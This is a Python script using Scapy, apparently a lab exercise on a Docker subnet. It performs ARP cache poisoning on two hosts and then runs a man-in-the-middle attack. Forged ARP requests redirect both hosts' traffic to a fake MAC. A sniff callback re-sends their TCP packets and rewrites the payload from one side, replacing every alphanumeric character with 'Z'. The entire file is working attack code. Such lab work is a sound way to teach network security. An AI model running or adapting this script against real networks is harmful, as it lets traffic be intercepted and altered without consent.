from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP



IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del (newpkt[TCP].payload)
        del (newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = re.sub(r'[0-9a-zA-Z]', r'Z', data.decode())
            send(newpkt/newdata)
        else:
            send(newpkt)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del (newpkt.chksum)
        del (newpkt[TCP].chksum)
        send(newpkt)

IP_V = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"

IP_T = "10.9.0.6"
MAC_T_fake = "02:42:8c:fa:82:f1"
ether = Ether(src=MAC_T_fake, dst=MAC_V_real)
arp = ARP(psrc=IP_T, hwsrc=MAC_T_fake,
          pdst=IP_V, hwdst=MAC_V_real)

arp.op = 1

frame = ether / arp

# iface로 docker로 연결된 인터페이스 설정해 줄 것 !
sendp(frame, iface='eth0')

IP_V = "10.9.0.6"
MAC_V_real = "02:42:0a:09:00:06"

IP_T = "10.9.0.5"
MAC_T_fake = "02:42:8c:fa:82:f1"
ether = Ether(src=MAC_T_fake, dst=MAC_V_real)
arp = ARP(psrc=IP_T, hwsrc=MAC_T_fake,
          pdst=IP_V, hwdst=MAC_V_real)

arp.op = 1

frame = ether / arp

# iface로 docker로 연결된 인터페이스 설정해 줄 것 !
sendp(frame, iface='eth0')


template = 'tcp and (ether src {A} or ether src {B})'
f = template.format(A=MAC_A, B=MAC_B)
pkt = sniff(iface='eth0', filter = f, prn=spoof_pkt)
